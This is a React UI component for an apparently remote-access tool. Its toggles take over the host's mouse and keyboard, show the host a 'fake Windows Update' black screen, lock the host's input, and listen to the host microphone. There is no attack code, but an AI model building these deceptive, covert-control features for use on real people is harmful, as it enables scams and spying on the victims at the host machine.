import React from 'react';
import { Switch } from '../components/ui/switch';
import { MousePointer2, MonitorOff, ShieldBan, Mic, Mic2, MicOff } from 'lucide-react';

export default function ControlPanel({
  controlActive,
  onControlToggle,
  blackScreen,
  onBlackScreenToggle,
  blockInput,
  onBlockInputToggle,
  audioMode,
  onAudioModeChange,
  disabled,
}) {
  return (
    <div className="bg-white border border-zinc-200 divide-y divide-zinc-100" data-testid="control-panel">
      {/* Header */}
      <div className="px-5 py-3 border-b border-zinc-100">
        <span className="text-xs font-bold uppercase tracking-[0.2em] text-zinc-500 font-body">
          Controls
        </span>
      </div>

      {/* Take Control */}
      <div className="flex items-center justify-between px-5 py-4">
        <div className="flex items-center gap-3">
          <MousePointer2 className="w-4 h-4 text-zinc-500" strokeWidth={1.5} />
          <div>
            <p className="text-sm font-medium text-zinc-900">Take Control</p>
            <p className="text-xs text-zinc-500">Capture mouse & keyboard</p>
          </div>
        </div>
        <Switch
          checked={controlActive}
          onCheckedChange={onControlToggle}
          disabled={disabled}
          data-testid="toggle-control"
        />
      </div>

      {/* Black Screen */}
      <div className="flex items-center justify-between px-5 py-4">
        <div className="flex items-center gap-3">
          <MonitorOff className="w-4 h-4 text-zinc-500" strokeWidth={1.5} />
          <div>
            <p className="text-sm font-medium text-zinc-900">Black Screen</p>
            <p className="text-xs text-zinc-500">Show fake Windows Update to host</p>
          </div>
        </div>
        <Switch
          checked={blackScreen}
          onCheckedChange={onBlackScreenToggle}
          disabled={disabled}
          data-testid="toggle-black-screen"
        />
      </div>

      {/* Block Host Input */}
      <div className="flex items-center justify-between px-5 py-4">
        <div className="flex items-center gap-3">
          <ShieldBan className="w-4 h-4 text-zinc-500" strokeWidth={1.5} />
          <div>
            <p className="text-sm font-medium text-zinc-900">Block Input</p>
            <p className="text-xs text-zinc-500">Lock host interaction</p>
          </div>
        </div>
        <Switch
          checked={blockInput}
          onCheckedChange={onBlockInputToggle}
          disabled={disabled}
          data-testid="toggle-block-input"
        />
      </div>

      {/* Audio Mode */}
      <div className="px-5 py-4">
        <div className="flex items-center gap-3 mb-3">
          <Mic className="w-4 h-4 text-zinc-500" strokeWidth={1.5} />
          <div>
            <p className="text-sm font-medium text-zinc-900">Audio</p>
            <p className="text-xs text-zinc-500">Microphone mode</p>
          </div>
        </div>
        <div className="flex gap-2">
          <button
            onClick={() => onAudioModeChange('off')}
            disabled={disabled}
            className={`flex-1 flex items-center justify-center gap-1 text-xs py-1.5 rounded border transition-colors ${
              audioMode === 'off'
                ? 'bg-zinc-800 text-white border-zinc-800'
                : 'text-zinc-500 border-zinc-200 hover:border-zinc-400'
            }`}
            title="No audio"
          >
            <MicOff className="w-3 h-3" strokeWidth={1.5} />
            Off
          </button>
          <button
            onClick={() => onAudioModeChange('one_way')}
            disabled={disabled}
            className={`flex-1 flex items-center justify-center gap-1 text-xs py-1.5 rounded border transition-colors ${
              audioMode === 'one_way'
                ? 'bg-[#002FA7] text-white border-[#002FA7]'
                : 'text-zinc-500 border-zinc-200 hover:border-zinc-400'
            }`}
            title="Hear host mic only"
          >
            <Mic className="w-3 h-3" strokeWidth={1.5} />
            1-Way
          </button>
          <button
            onClick={() => onAudioModeChange('two_way')}
            disabled={disabled}
            className={`flex-1 flex items-center justify-center gap-1 text-xs py-1.5 rounded border transition-colors ${
              audioMode === 'two_way'
                ? 'bg-green-600 text-white border-green-600'
                : 'text-zinc-500 border-zinc-200 hover:border-zinc-400'
            }`}
            title="Both mics active"
          >
            <Mic2 className="w-3 h-3" strokeWidth={1.5} />
            2-Way
          </button>
        </div>
        <p className="text-xs text-zinc-400 mt-1.5">
          {audioMode === 'off'     && 'No audio'}
          {audioMode === 'one_way' && 'Hearing host mic'}
          {audioMode === 'two_way' && 'Both mics active'}
        </p>
      </div>
    </div>
  );
}
